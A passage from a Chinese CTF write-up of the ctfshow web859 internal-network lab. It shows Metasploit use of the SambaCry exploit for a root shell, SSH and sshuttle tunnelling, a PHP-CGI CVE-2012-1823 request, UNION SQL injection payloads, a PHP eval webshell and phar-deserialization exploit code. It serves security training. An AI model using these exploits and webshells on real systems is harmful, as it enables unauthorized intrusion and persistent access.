+</ul>
+<p>题目描述说“攻击机预置了某些工具”，刚才进入&#x2F;tmp目录发现有msfinstall，这里应该有msf</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221980.png" srcset="/img/loading.gif" lazyload alt="image-20260216085204559"></p>
+<p>果然有msf</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">msfconsole</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221412.png" srcset="/img/loading.gif" lazyload alt="image-20260216085317738"></p>
+<h1 id="WORKGROUP-oa"><a href="#WORKGROUP-oa" class="headerlink" title="WORKGROUP\oa"></a>WORKGROUP\oa</h1><p>我们前面提到过Windows 6.1指的是 Windows 7 或 Server 2008 R2，而Windows 7 和 Server 2008 R2 是 <strong>MS17-010 (永恒之蓝)</strong> 漏洞的“重灾区”，没打补丁（KB4012212）且开启了 445 端口，基本是一打一个准。</p>
+<p>我们先打WORKGROUP\oa，尝试msf一把梭</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">search</span> ms17_010  <span class="hljs-comment">#msf搜索一下相关模块</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221657.png" srcset="/img/loading.gif" lazyload alt="image-20260216162439261"></p>
+<p>先使用扫描模块对靶机进行扫描</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">use</span> auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-keyword">set</span> rhost 172.2.164.6<br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>
+
+<p>不通，不应该啊</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221922.png" srcset="/img/loading.gif" lazyload alt="image-20260218091738362"></p>
+<p>而ping的过程中发现ttl&#x3D;64</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ping</span> <span class="hljs-number">172.2.164.6</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>TTL &#x3D; 64</strong> 左右：通常是 <strong>Linux</strong>。</li>
+<li><strong>TTL &#x3D; 128</strong> 左右：通常是 <strong>Windows</strong>。<em>(这可以修改，但 CTF 中通常准)</em></li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221519.png" srcset="/img/loading.gif" lazyload alt="image-20260218092003003"></p>
+<p>所以说这是一个linux。</p>
+<p>很奇怪，这里我们信息收集一下</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use auxiliary/scanner/smb/smb_version<br><span class="hljs-built_in">set</span> RHOSTS 172.2.164.6<br><span class="hljs-built_in">set</span> THREADS 10<br><span class="hljs-built_in">run</span><br><br>use auxiliary/scanner/smb/smb_enumshares<br><span class="hljs-built_in">set</span> RHOSTS 172.2.164.6<br><span class="hljs-built_in">set</span> THREADS 10<br>run<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152221881.png" srcset="/img/loading.gif" lazyload alt="image-20260218141650679"></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222782.png" srcset="/img/loading.gif" lazyload alt="image-20260218141710068"></p>
+<p>这里泄露了两个比较重要的东西：</p>
+<ol>
+<li><strong>服务和版本号</strong>：Samba Server Version 4.6.3</li>
+<li><strong>共享名泄漏</strong>：myshare</li>
+</ol>
+<h2 id="SambaCry-CVE-2017-7494"><a href="#SambaCry-CVE-2017-7494" class="headerlink" title="SambaCry (CVE-2017-7494)"></a>SambaCry (CVE-2017-7494)</h2><p>Samba是一个用于在Linux和Windows之间传输或共享文件的文件服务器，专门用来<strong>模拟 Windows 的文件共享功能</strong>。</p>
+<p>它采用客户端-服务器（C&#x2F;S）模式工作，并使用UDP和TCP端口137、138、139和445。Samba可以用于搭建局域网文件服务器，方便共享资源，也可以用于共享打印机。</p>
+<p>fscan 之前扫描出的 “Windows 6.1” 是由于这台 Linux 运行了 Samba 服务，而且Samba 的配置文件 (&#x2F;etc&#x2F;samba&#x2F;smb.conf) 里有一行配置叫 server string。管理员可以在这里随便写，比如写成 Windows 7 Professional。扫描器读取到这个字符串，就会被骗，以为对面是 Windows，fscan就误报了。</p>
+<p>msf搜一下samba的洞</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">search samba</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222560.png" srcset="/img/loading.gif" lazyload alt="image-20260216165103624"></p>
+<p>这里我们使用SambaCry</p>
+<p><strong>SambaCry (CVE-2017-7494)</strong> 漏洞影响的版本范围是 Samba 3.5.0 到 4.6.4&#x2F;4.5.10&#x2F;4.4.14。目标版本是 <strong>4.6.3</strong>，在受影响范围内</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/linux/samba/is_known_pipename<br><span class="hljs-comment"># SMB_SHARE_NAME设置为刚才扫出来的共享名，这里可设置可不设置，因为自动探测路径也是对的</span><br><span class="hljs-built_in">set</span> SMB_SHARE_NAME myshare<br><span class="hljs-built_in">set</span> rhost 172.2.164.6<br>exploit<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222178.png" srcset="/img/loading.gif" lazyload alt="image-20260218093153013"></p>
+<p>输入shell进入交互，在root处拿到flag</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222798.png" srcset="/img/loading.gif" lazyload alt="image-20260218093232286"></p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">cat /root/flag.txt<br>ctfshow&#123;e7899cb3-<span class="hljs-number">53b6</span>-<span class="hljs-number">4e01</span>-b8c8-5b4cf7e88368&#125;<br></code></pre></td></tr></table></figure>
+
+<p>退回msfconsole的话，ctrl+z，输入y即可（可以搜一下msf的使用）</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222865.png" srcset="/img/loading.gif" lazyload alt="image-20260218093600496"></p>
+<h1 id="CTFshow文件管理系统"><a href="#CTFshow文件管理系统" class="headerlink" title="CTFshow文件管理系统"></a>CTFshow文件管理系统</h1><h2 id="隧道搭建"><a href="#隧道搭建" class="headerlink" title="隧道搭建"></a>隧道搭建</h2><p><code>172.2.164.6</code>是web服务，我们最好访问一下，这就需要搭建隧道，而网上wp大多都是端口映射，我认为并不方便，这里提供两种更好的隧道搭建方式</p>
+<h3 id="ssh-socks"><a href="#ssh-socks" class="headerlink" title="ssh socks"></a>ssh socks</h3><p>SSH 本身支持动态端口转发（SOCKS5 代理），无需额外工具即可建立本地代理通道：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ssh -D <span class="hljs-number">55556</span> ctfshow@pwn<span class="hljs-selector-class">.challenge</span><span class="hljs-selector-class">.ctf</span><span class="hljs-selector-class">.show</span> -<span class="hljs-selector-tag">p</span> <span class="hljs-number">28254</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-D 55556</code> ：在本地开启 55556 端口作为 SOCKS5 代理</li>
+<li><code>ctfshow@pwn.challenge.ctf.show</code> ：远程登录用户和主机</li>
+<li><code>-p 28254</code> ：指定 SSH 端口</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222711.png" srcset="/img/loading.gif" lazyload alt="image-20260216084136951"></p>
+<p>连接成功后，将浏览器或其他工具的代理设置为：</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:55556</span> （SOCKS5）<br></code></pre></td></tr></table></figure>
+
+<p>即可通过远程服务器转发流量。</p>
+<p>比如这里用Kali的firefox+foxyproxy访问内网。我复用以前设置好的foxyproxy：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222486.png" srcset="/img/loading.gif" lazyload alt="image-20260216173046680"></p>
+<p>访问内网成功</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222635.png" srcset="/img/loading.gif" lazyload alt="image-20260218094855591"></p>
+<p>如果要抓包的话，foxyproxy先换成burp suite代理</p>
+<p>打开bp设置，配置socks代理</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222943.png" srcset="/img/loading.gif" lazyload alt="image-20260216173752555"></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222630.png" srcset="/img/loading.gif" lazyload alt="image-20260218095021931"></p>
+<p>整体流量路径如下：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">浏览器<br>   ↓（FoxyProxy 代理转发）<br><span class="hljs-keyword">BurpSuite</span><br><span class="hljs-keyword"></span>   ↓（配置的 SOCKS5 代理）<br>SSH 隧道<br>   ↓<br>跳板机（内网）<br></code></pre></td></tr></table></figure>
+
+<h3 id="sshuttle-VPN"><a href="#sshuttle-VPN" class="headerlink" title="sshuttle VPN"></a>sshuttle VPN</h3><p>sshuttle是一个透明代理服务器，功能类似于简易版 VPN。通过 SSH 转发流量，支持 DNS 隧道。</p>
+<p>在Kali里安装sshuttle</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> update<br>sudo apt-<span class="hljs-built_in">get</span> install sshuttle<br></code></pre></td></tr></table></figure>
+
+<p>使用方法如下：</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># sshuttle 的基本使用方法</span><br>sshuttle [options...] [-r [username<span class="hljs-meta">@]sshserver[:port]]</span> \<span class="hljs-variable">&lt;subnets...&gt;</span><br>sshuttle -r <span class="hljs-variable">&lt;user&gt;</span><span class="hljs-meta">@&lt;remote_host&gt;</span> <span class="hljs-variable">&lt;network&gt;</span><br><br><span class="hljs-comment"># 将本地所有流量转发到远程网络</span><br>sshuttle -r username<span class="hljs-meta">@remotehost</span> 0.0.0.0/0<br><span class="hljs-comment"># 转发特定子网的流量，比如 192.168.10.0/24</span><br>sshuttle -r username<span class="hljs-meta">@remotehost</span> 192.168.10.0/24<br><span class="hljs-comment"># 转发多个子网，比如 10.0.0.0 和 172.16.0.0</span><br>sshuttle -r username<span class="hljs-meta">@remotehost</span> 10.0.0.0/8 172.16.0.0/16<br></code></pre></td></tr></table></figure>
+
+<p>这里需要转发<code>172.2.164.0/24</code>网段：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> sshuttle -r ctfshow@pwn.challenge.ctf.show:<span class="hljs-number">28254</span> <span class="hljs-number">172.2.164.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<p>输入yes，输入密码</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222923.png" srcset="/img/loading.gif" lazyload alt="image-20260218093930595"></p>
+<p>此时无需 FoxyProxy，firefox直接访问<code>http://172.2.164.5/</code>即可</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222507.png" srcset="/img/loading.gif" lazyload alt="image-20260218094823990"></p>
+<p>抓包的话，就像打CTF比赛一样，foxyproxy设置bp代理就行。（如果前面尝试过ssh socks，让bp关闭socks5也照常抓包）</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222272.png" srcset="/img/loading.gif" lazyload alt="image-20260218095058964"></p>
+<p>此时流量路径：</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">浏览器<br>   ↓（HTTP 代理）<br><span class="hljs-keyword">BurpSuite</span><br><span class="hljs-keyword"></span>   ↓<br>本机路由（sshuttle）<br>   ↓<br>SSH 隧道<br>   ↓<br>跳板机<br>   ↓<br>内网目标<br></code></pre></td></tr></table></figure>
+
+<h2 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h2><p>fscan扫出一个cve，是PHP-CGI远程代码执行漏洞，原理可参考<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-cgi-cve-2012-1823.html">PHP-CGI远程代码执行漏洞（CVE-2012-1823）分析 | 离别歌</a>，这里直接找poc打</p>
+<p>poc如下（这个poc包多发几次，概率回显）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.2.97.5<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=999c1f093e6bc7b474d230267852aad2<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>29<br><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>); <span class="hljs-keyword">die</span>(); <span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222850.png" srcset="/img/loading.gif" lazyload alt="image-20260218105044260"></p>
+<p>github上有很多脚本，例如：<a target="_blank" rel="noopener" href="https://github.com/0xl0k1/CVE-2012-1823">0xl0k1&#x2F;CVE-2012-1823: PHP CGI Argument Injection.</a></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/php_cgi.sh http:/</span><span class="hljs-regexp">/172.2.97.5/</span> <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222764.png" srcset="/img/loading.gif" lazyload alt="image-20260218105148105"></p>
+<p>这里写入webshell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo &#x27;&lt;?php @eval(\$_POST[cmd]);?&gt;&#x27; &gt; 1.php&quot;</span>); <span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>写入成功：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222716.png" srcset="/img/loading.gif" lazyload alt="image-20260218105829726"></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222176.png" srcset="/img/loading.gif" lazyload alt="image-20260218110150295"></p>
+<p>蚁剑连接</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222484.png" srcset="/img/loading.gif" lazyload alt="image-20260218110215595"></p>
+<p>如果使用的是ssh socks的话，别忘了在蚁剑里设置socks再连接；sshuttle不用设置</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222720.png" srcset="/img/loading.gif" lazyload alt="image-20260218110415494"></p>
+<p>但是没找到flag</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -type f -name <span class="hljs-string">&quot;flag.txt&quot;</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> <br></code></pre></td></tr></table></figure>
+
+<p>可能需要提权？</p>
+<p>但可能也没有flag，因为交了上面那个flag就显示完成了，难道这是蜜罐？</p>
+<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>看很多wp都是在这个网站首页看到gitee仓库的链接，代码审计打的，但现在这个gitee仓库已经没有了</p>
+<p>就当黑盒打一遍吧</p>
+<p>在email处依次注入出用户名密码</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222371.png" srcset="/img/loading.gif" lazyload alt="image-20260218130805800"></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>username<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>user<span class="hljs-meta">#@qq.com</span><br><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>password<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>user<span class="hljs-meta">#@qq.com</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222242.png" srcset="/img/loading.gif" lazyload alt="image-20260218130829991"></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222506.png" srcset="/img/loading.gif" lazyload alt="image-20260218130045659"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">用户名：ctfshow<br>密码：ctfshase?<span class="hljs-string">??</span>?<br></code></pre></td></tr></table></figure>
+
+<p>Kali是带php的，我们在Kali里做一个phar</p>
+<p>先做一个phar.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//phar.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">action</span></span>&#123;<br>   <span class="hljs-keyword">private</span> <span class="hljs-variable">$email</span>=<span class="hljs-string">&quot;&#x27;.eval(\$_POST[1]));//&quot;</span>; <span class="hljs-comment">//这样写是为了闭合闭合前面的exit然后注释后面的语句</span><br>&#125;<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;web859.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;web859.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;1.png&#x27;</span>).<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="hljs-comment">//设置stub标志，需要写一个真的jpg文件进去保证等会能够上传成功，命名为1.png</span><br><span class="hljs-variable">$o</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">action</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-variable">$o</span>));<span class="hljs-comment">//设置自定义的meta-data</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;hello~&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后在同目录随便放一张图片，命名为<code>1.png</code></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152222019.png" srcset="/img/loading.gif" lazyload alt="image-20260218131626365"></p>
+<p>然后运行phar.php，生成web859.phar</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">php -d phar.<span class="hljs-attribute">readonly</span>=0 phar.php<br></code></pre></td></tr></table></figure>
+
+<p>把web859.phar重命名为web859.png</p>
+<p>然后在Images处上传图片</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152223828.png" srcset="/img/loading.gif" lazyload alt="image-20260218134430490"></p>
+<p>在数据包里找到文件上传的位置</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>ckfinder<span class="hljs-regexp">/userfiles/im</span>ages/web859.png<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152223603.png" srcset="/img/loading.gif" lazyload alt="image-20260218134623816">现在我们直接去用phar伪协议读取这个图片，从而把我们的马写到<code>../mail_cache/cache.php</code></p>
+<p>去<code>api/index.php</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">api/index.php?a=view<br>file=phar:<span class="hljs-regexp">//</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>ckfinder<span class="hljs-regexp">/userfiles/im</span>ages/web859.png<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152223335.png" srcset="/img/loading.gif" lazyload alt="image-20260218134708439"></p>
+<p>蚁剑连接即可</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152223390.png" srcset="/img/loading.gif" lazyload alt="image-20260218134210976"></p>
+<p>这个打法还是得代码审计才能自己打，黑盒就这样一步步照着打下来。</p>
+<p>连上webshell可以把源码拷贝一份，自己审审。</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://clowsman.github.io/2024/04/24/ctfshow-web859/index.html">ctfshow_web859 | clown</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/thebeastofwar/p/17750376.html">ctfshow web859_有跳板机 WP - BattleofZhongDinghe - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Y0uhe/p/17688128.html">ctfshow–一个有趣的内网靶场 - LinkPoc - 博客园</a></p>
+<p><a target="_blank" rel="noopener" href="https://wanth3f1ag.top/2025/06/15/ctfshow%E5%85%A5%E9%97%A8%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">wanth3f1ag.top&#x2F;2025&#x2F;06&#x2F;15&#x2F;ctfshow入门内网渗透&#x2F;</a></p>
+<p><a target="_blank" rel="noopener" href="https://c1oudfl0w0.github.io/blog/2024/07/20/ctfshow-web859-%E6%9C%89%E8%B7%B3%E6%9D%BF%E6%9C%BA/">ctfshow web859_有跳板机 | 雲流のLowest World(・ω&lt; )★</a></p>
+<p><a target="_blank" rel="noopener" href="https://itadn.com/i0_90223666067/42934">CTFShow Web 入门级 内网渗透技术章节-ITADN社区</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PenTest/" class="category-chain-item">PenTest</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctfshow/" class="print-no-link">#ctfshow</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>ctfshow web859_有跳板机</div>
+      <div>http://example.com/2026/test65/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/test42/" title="vulnhub Me-and-My-Girlfriend-1">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">vulnhub Me-and-My-Girlfriend-1</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/test45/" title="域渗透基础">
+                        <span class="hidden-mobile">域渗透基础</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
